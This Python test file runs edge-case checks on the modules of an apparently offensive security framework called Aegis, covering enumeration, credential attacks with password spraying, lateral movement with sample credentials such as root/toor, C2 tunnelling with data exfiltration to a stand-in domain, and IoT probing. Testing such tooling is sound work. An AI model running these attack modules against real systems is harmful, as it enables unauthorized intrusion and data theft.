"""Boundary tests for all Aegis attack modules — ensures no crash on edge inputs."""

from aegis.models import AttackResult, Credential, EngagementContext, OpenPort
from aegis.modules.enum import EnumModule
from aegis.modules.cred import CredAttackModule
from aegis.modules.lateral import LateralModule
from aegis.modules.tunnel import TunnelModule
from aegis.modules.iot import IoTModule


# ── EnumModule ──────────────────────────────────────────────────────────────

def test_enum_run_no_open_ports_no_targets():
    ctx = EngagementContext(targets=[], ports=[], timeout=0.5)
    results = EnumModule().run(ctx, domain="")
    assert isinstance(results, list)


def test_enum_run_empty_domain():
    ctx = EngagementContext(targets=["192.0.2.1"], ports=[445], timeout=0.5)
    results = EnumModule().run(ctx, domain="")
    assert isinstance(results, list)


def test_enum_run_unreachable_smb():
    ctx = EngagementContext(targets=["192.0.2.1"], timeout=0.3)
    ctx.open_ports = [OpenPort("192.0.2.1", 445, "SMB")]
    results = EnumModule().run(ctx, domain="test.local")
    assert isinstance(results, list)


def test_enum_run_unreachable_ldap():
    ctx = EngagementContext(targets=["192.0.2.1"], timeout=0.3)
    ctx.open_ports = [OpenPort("192.0.2.1", 389, "LDAP")]
    results = EnumModule().run(ctx, domain="test.local")
    assert isinstance(results, list)


def test_enum_run_unreachable_dns():
    ctx = EngagementContext(targets=["192.0.2.1"], timeout=0.3)
    ctx.open_ports = [OpenPort("192.0.2.1", 53, "DNS")]
    results = EnumModule().run(ctx, domain="test.local")
    assert isinstance(results, list)


# ── CredAttackModule ────────────────────────────────────────────────────────

def test_cred_run_no_open_ports():
    ctx = EngagementContext(timeout=0.3)
    results = CredAttackModule().run(ctx)
    assert results == []


def test_cred_run_unreachable_ssh():
    ctx = EngagementContext(timeout=0.3)
    ctx.open_ports = [OpenPort("192.0.2.1", 22, "SSH")]
    results = CredAttackModule().run(ctx)
    assert isinstance(results, list)


def test_cred_run_unreachable_redis():
    ctx = EngagementContext(timeout=0.3)
    ctx.open_ports = [OpenPort("192.0.2.1", 6379, "Redis")]
    results = CredAttackModule().run(ctx)
    assert isinstance(results, list)


def test_cred_run_unreachable_ftp():
    ctx = EngagementContext(timeout=0.3)
    ctx.open_ports = [OpenPort("192.0.2.1", 21, "FTP")]
    results = CredAttackModule().run(ctx)
    assert isinstance(results, list)


def test_cred_run_with_spray_password():
    ctx = EngagementContext(timeout=0.3)
    ctx.open_ports = [OpenPort("192.0.2.1", 22, "SSH")]
    results = CredAttackModule().run(ctx, spray_password="TestPass123!")
    assert isinstance(results, list)


# ── LateralModule ───────────────────────────────────────────────────────────

def test_lateral_run_no_credentials():
    ctx = EngagementContext(timeout=0.3)
    results = LateralModule().run(ctx, command="whoami", domain="")
    assert isinstance(results, list)
    assert any("credential" in r.notes.lower() or "need" in r.notes.lower() for r in results) or results == []


def test_lateral_run_fake_smb_cred():
    ctx = EngagementContext(timeout=0.3)
    ctx.credentials = [Credential("SMB", "192.0.2.1", 445, "admin", "pass")]
    results = LateralModule().run(ctx, command="whoami", domain="")
    assert isinstance(results, list)


def test_lateral_run_fake_ssh_cred():
    ctx = EngagementContext(timeout=0.3)
    ctx.credentials = [Credential("SSH", "192.0.2.1", 22, "root", "toor")]
    results = LateralModule().run(ctx, command="id", domain="")
    assert isinstance(results, list)


def test_lateral_run_empty_command():
    ctx = EngagementContext(timeout=0.3)
    ctx.credentials = [Credential("SSH", "192.0.2.1", 22, "root", "toor")]
    results = LateralModule().run(ctx, command="", domain="")
    assert isinstance(results, list)


def test_lateral_run_long_command():
    ctx = EngagementContext(timeout=0.3)
    ctx.credentials = [Credential("SSH", "192.0.2.1", 22, "root", "toor")]
    results = LateralModule().run(ctx, command="A" * 10000, domain="")
    assert isinstance(results, list)


# ── TunnelModule ────────────────────────────────────────────────────────────

def test_tunnel_run_no_c2_domain():
    ctx = EngagementContext(timeout=0.3)
    results = TunnelModule().run(ctx, c2_domain="", data_to_exfil="")
    assert isinstance(results, list)


def test_tunnel_run_with_c2_domain():
    ctx = EngagementContext(timeout=0.3)
    results = TunnelModule().run(ctx, c2_domain="nonexistent.invalid", data_to_exfil="test")
    assert isinstance(results, list)


def test_tunnel_run_empty_exfil_data():
    ctx = EngagementContext(timeout=0.3)
    results = TunnelModule().run(ctx, c2_domain="nonexistent.invalid", data_to_exfil="")
    assert isinstance(results, list)


def test_tunnel_run_large_exfil_data():
    ctx = EngagementContext(timeout=0.3)
    results = TunnelModule().run(ctx, c2_domain="nonexistent.invalid", data_to_exfil="X" * 1000)
    assert isinstance(results, list)


def test_tunnel_http_beacon_no_http_ports():
    ctx = EngagementContext(timeout=0.3)
    results = TunnelModule().run(ctx, c2_domain="", data_to_exfil="")
    assert isinstance(results, list)


# ── IoTModule ───────────────────────────────────────────────────────────────

def test_iot_run_no_open_ports():
    ctx = EngagementContext(timeout=0.3)
    results = IoTModule().run(ctx)
    assert results == []


def test_iot_run_unreachable_mqtt():
    ctx = EngagementContext(timeout=0.3)
    ctx.open_ports = [OpenPort("192.0.2.1", 1883, "MQTT")]
    results = IoTModule().run(ctx)
    assert isinstance(results, list)


def test_iot_run_unreachable_modbus():
    ctx = EngagementContext(timeout=0.3)
    ctx.open_ports = [OpenPort("192.0.2.1", 502, "Modbus")]
    results = IoTModule().run(ctx)
    assert isinstance(results, list)


def test_iot_run_unreachable_telnet():
    ctx = EngagementContext(timeout=0.3)
    ctx.open_ports = [OpenPort("192.0.2.1", 23, "Telnet")]
    results = IoTModule().run(ctx)
    assert isinstance(results, list)


def test_iot_run_unreachable_http():
    ctx = EngagementContext(timeout=0.3)
    ctx.open_ports = [OpenPort("192.0.2.1", 80, "HTTP")]
    results = IoTModule().run(ctx)
    assert isinstance(results, list)
